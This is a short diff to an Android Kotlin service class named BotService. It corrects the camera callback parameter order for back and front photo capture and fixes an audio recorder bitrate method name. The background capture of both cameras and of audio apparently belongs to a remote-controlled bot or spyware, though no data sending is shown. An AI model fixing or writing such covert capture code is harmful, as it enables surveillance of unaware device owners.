@@ -242,7 +242,7 @@ class BotService : Service() {
                     backCamera.startPreview()
                     Thread.sleep(1200)
                     val latch1 = CountDownLatch(1)
-                    backCamera.takePicture(null, null, { _, data ->
+                    backCamera.takePicture(null, null, { data, _ ->
                         backBytes = data
                         latch1.countDown()
                     })
@@ -263,7 +263,7 @@ class BotService : Service() {
                     frontCamera.startPreview()
                     Thread.sleep(1200)
                     val latch2 = CountDownLatch(1)
-                    frontCamera.takePicture(null, null, { _, data ->
+                    frontCamera.takePicture(null, null, { data, _ ->
                         frontBytes = data
                         latch2.countDown()
                     })
@@ -301,7 +301,7 @@ class BotService : Service() {
                     setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                     setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                     setAudioSamplingRate(44100)
-                    setAudioBitRate(128000)
+                    setAudioEncodingBitRate(128000)
                     setOutputFile(file.absolutePath)
                     prepare()
                     start()
